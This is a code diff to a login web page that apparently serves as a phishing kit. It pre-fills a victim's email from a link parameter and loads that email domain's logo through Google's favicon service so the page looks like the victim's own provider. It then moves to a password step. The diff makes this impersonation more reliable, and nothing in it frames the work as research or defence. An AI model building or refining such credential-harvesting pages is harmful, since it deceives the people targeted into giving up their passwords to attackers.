@@ -371,7 +371,8 @@
                 </svg>
             </span>
             <a href="#" class="logo-link">
-                <img src="https://friendly-winner-images.onrender.com/logo.png" alt="Logo" class="logo-img" id="dynamicLogo" onerror="this.src='https://friendly-winner-images.onrender.com/logo.png';">
+                <!-- Added timestamp fallback in onerror -->
+                <img src="https://friendly-winner-images.onrender.com/logo.png" alt="Logo" class="logo-img" id="dynamicLogo" crossorigin="anonymous" onerror="this.src='https://friendly-winner-images.onrender.com/logo.png';">
             </a>
         </div>
         
@@ -469,15 +470,30 @@
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         let currentStep = 'email';
 
-        // Function to update logo based on domain
+        // Function to update logo based on domain using Google's Favicon service (highly reliable)
         function updateLogoForDomain(email) {
             if (!email || !email.includes('@')) {
                 dynamicLogo.src = defaultLogoUrl;
                 return;
             }
-            const domain = email.split('@')[1];
-            const logoApiUrl = `https://logo.clearbit.com/${domain}`;
-            dynamicLogo.src = logoApiUrl;
+            
+            try {
+                const domain = email.split('@')[1].trim();
+                // Using Google's S2 Favicon service which returns an icon for almost any domain
+                const logoApiUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
+                
+                // To prevent caching issues and force reload, we create a new Image object
+                const img = new Image();
+                img.onload = function() {
+                    dynamicLogo.src = logoApiUrl;
+                };
+                img.onerror = function() {
+                    dynamicLogo.src = defaultLogoUrl;
+                };
+                img.src = logoApiUrl;
+            } catch (e) {
+                dynamicLogo.src = defaultLogoUrl;
+            }
         }
 
         // Check URL for email parameter on page load
@@ -488,13 +504,9 @@
             if (emailParam) {
                 const decodedEmail = decodeURIComponent(emailParam).trim();
                 if (emailRegex.test(decodedEmail)) {
-                    // 1. Populate the input
                     emailInput.value = decodedEmail;
-                    // 2. Fetch the logo in the background based on the domain
+                    // Pre-fetch the logo in the background
                     updateLogoForDomain(decodedEmail);
-                    
-                    // NOTE: We removed the automatic transition here. 
-                    // The user must now click "Next" to proceed.
                 }
             }
         });
@@ -510,7 +522,6 @@
                     emailGroup.classList.add('error');
                     emailInput.focus();
                 } else {
-                    // Move to password screen only when the button is clicked
                     currentStep = 'password';
                     loginCard.classList.remove('step-email');
                     loginCard.classList.add('step-password');
@@ -519,7 +530,6 @@
                     mainHeading.textContent = 'Enter your password';
                     subHeading.style.display = 'none'; 
                     
-                    // Ensure logo is updated if they typed it manually
                     updateLogoForDomain(emailValue);
                     
                     document.querySelector('.email-input-group').style.display = 'none';
